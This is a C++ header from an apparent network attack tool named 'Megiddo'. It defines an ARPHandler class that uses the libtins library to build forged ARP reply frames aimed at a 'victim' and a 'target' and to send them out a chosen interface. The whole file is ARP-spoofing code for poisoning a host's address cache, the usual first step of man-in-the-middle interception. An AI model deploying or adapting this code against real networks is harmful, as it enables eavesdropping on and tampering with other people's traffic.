#ifndef ARPHANDLER_H
#define ARPHANDLER_H
#include <string>
#include <tins/tins.h>
#include <iostream>
#include <vector>

namespace Megiddo{
    class ARPHandler{
        public:
            ARPHandler(std::string *hw_victim, std::string *hw_target, std::string *ip_victim, std::string *ip_target, const std::string iface){
                this->hw_victim = *hw_victim;
                this->hw_target = *hw_target;
                this->ip_victim = *ip_victim;
                this->ip_target = *ip_target;
                this->iface = Tins::NetworkInterface::default_interface();
                std::vector<Tins::NetworkInterface> ifaces = Tins::NetworkInterface::all();
                for(int i=0; i < ifaces.size(); i++){
                    if(strcmp(ifaces[i].name().c_str(), iface.c_str()) == 0){
                        this->iface = ifaces[i];
                        break;
                    }
                }
                Tins::NetworkInterface::Info info = this->iface.addresses();
                this->my_hw = info.hw_addr.to_string();
                this->buildFrame();
                this->packetsender = new Tins::PacketSender();

            }
            void buildFrame(){
                this->frame = Tins::EthernetII(this->hw_victim, this->hw_target);
                Tins::ARP arpHeader = Tins::ARP(this->ip_victim, this->ip_target, this->hw_victim, this->hw_target);
                arpHeader.opcode(Tins::ARP::Flags::REPLY);
                this->frame /= arpHeader;
            };

            void send(){
                this->packetsender->send(this->frame, this->iface);
            }

        private:
            std::string hw_victim, hw_target, ip_victim, ip_target, my_hw;
            Tins::EthernetII frame;
            Tins::NetworkInterface iface;
            Tins::PacketSender *packetsender;
    };
}
#endif